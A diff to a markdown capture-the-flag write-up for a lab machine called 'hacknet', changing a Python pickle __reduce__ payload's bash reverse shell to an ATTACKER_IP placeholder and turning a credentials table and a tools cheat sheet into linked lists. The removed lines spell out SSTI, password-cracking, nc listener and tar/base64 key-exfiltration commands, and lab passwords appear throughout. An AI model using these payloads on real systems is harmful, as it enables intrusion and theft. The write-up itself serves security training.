@@ -317,7 +317,7 @@ import time
 
 class RCE:
     def __reduce__(self):
-        cmd = 'bash -c "bash -i >& /dev/tcp/10.10.14.146/4444 0>&1"'
+        cmd = 'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"'
         return (os.system, (cmd,))
 
 # Generate a cache key (you might need to guess the right key format)
@@ -431,13 +431,15 @@ Root password: `h4ck3rs4re3veRywh3re99`. Reuse it for root.
 
 ## Credentials
 
-| Where                            | Credential                                                |
-| -------------------------------- | --------------------------------------------------------- |
-| SSTI dump (`deepdive`)           | `deepdive@hacknet.htb` / `D33pD!v3r`                      |
-| SSTI dump (`backdoor_bandit`)    | `mikey@hacknet.htb` / `mYd4rks1dEisH3re` → SSH as `mikey` |
-| `settings.py` (Django DB)        | `sandy` / `h@ckn3tDBpa$$` (MySQL)                         |
-| sandy GPG private key passphrase | `sweetheart`                                              |
-| Decrypted backup chat log        | MySQL root / `h4ck3rs4re3veRywh3re99` → root              |
+**SSTI dump (`deepdive`)** — `deepdive@hacknet.htb` / `D33pD!v3r`
+
+**SSTI dump (`backdoor_bandit`)** — `mikey@hacknet.htb` / `mYd4rks1dEisH3re` → SSH as `mikey`
+
+**`settings.py` (Django DB)** — `sandy` / `h@ckn3tDBpa$$` (MySQL)
+
+**sandy GPG private key passphrase** — `sweetheart`
+
+**Decrypted backup chat log** — MySQL root / `h4ck3rs4re3veRywh3re99` → root
 
 ---
 
@@ -461,18 +463,16 @@ Root password: `h4ck3rs4re3veRywh3re99`. Reuse it for root.
 
 ## Tools & cheat sheet
 
-| Tool                        | Purpose in this box                             | Key command                                                           |
-| --------------------------- | ----------------------------------------------- | --------------------------------------------------------------------- |
-| `gobuster`                  | Directory brute force (authenticated)           | `gobuster dir -w <wl> -u http://hacknet.htb -c "<cookies>" -b logout` |
-| Burp / raw HTTP             | Enumerate contacts endpoint, confirm own userId | `GET /contacts?action=request&userId=27`                              |
-| SSTI (`{{ users.values }}`) | Dump user table via username → likes sink       | set profile `username={{users.values}}`                               |
-| `sshpass`                   | SSH with recovered password                     | `sshpass "mYd4rks1dEisH3re" ssh mikey@hacknet.htb`                    |
-| `lsof` / `netstat` / `ps`   | Local service + socket enumeration              | `lsof -U`, `netstat -tunlp`, `ps aux`                                 |
-| `mysql`                     | Read Django DB via leaked sandy creds           | `mysql -u sandy -p'h@ckn3tDBpa$$' -S /run/mysqld/mysqld.sock hacknet` |
-| `hashcat`                   | Crack Django pbkdf2 admin hash                  | `hashcat -m 10000 hash.txt rockyou.txt.gz`                            |
-| Python `pickle`             | Build poisoned Django cache entry               | `pickle.dumps(RCE())` with `__reduce__` → `os.system`                 |
-| `nc`                        | Catch reverse shell from cache trigger          | `nc -lvnp 4444`                                                       |
-| `tar` + `base64`            | Exfil GPG private keys over a shell             | `tar czf - ./ \| base64` / `base64 -d \| tar xzf -`                   |
-| `gpg2john` + `john`         | Crack GPG key passphrase (`sweetheart`)         | `gpg2john *.key > h; john h --wordlist=rockyou.txt`                   |
-| `gpg`                       | Decrypt SQL backups                             | `gpg --decrypt backup01.sql.gpg > backup01.sql`                       |
-| `grep`                      | Find root password in decrypted backups         | `cat *.sql \| grep password`                                          |
+- **`gobuster`** — Directory brute force (authenticated)
+- **Burp / raw HTTP** — Enumerate contacts endpoint, confirm own userId
+- [SSTI (`{{ users.values }}`)](/hacklas/enumeration/ssti/python-jinja2.md) — Dump user table via username → likes sink
+- [`sshpass`](/hacklas/convenience/ssh/use-sshpass-so-ssh-does-not-prompt-for-password.md) — SSH with recovered password
+- **`lsof` / `netstat` / `ps`** — Local service + socket enumeration
+- [`mysql`](/hacklas/enumeration/sql/mysql.md) — Read Django DB via leaked sandy creds
+- [`hashcat`](/hacklas/infiltration/cracking/hashcat.md) — Crack Django pbkdf2 admin hash
+- **Python `pickle`** — Build poisoned Django cache entry
+- [`nc`](/hacklas/infiltration/reverse-shell/nc.md) — Catch reverse shell from cache trigger
+- [`tar` + `base64`](/hacklas/infiltration/dump/directory-with-nc.md) — Exfil GPG private keys over a shell
+- **`gpg2john` + `john`** — Crack GPG key passphrase (`sweetheart`)
+- **`gpg`** — Decrypt SQL backups
+- **`grep`** — Find root password in decrypted backups
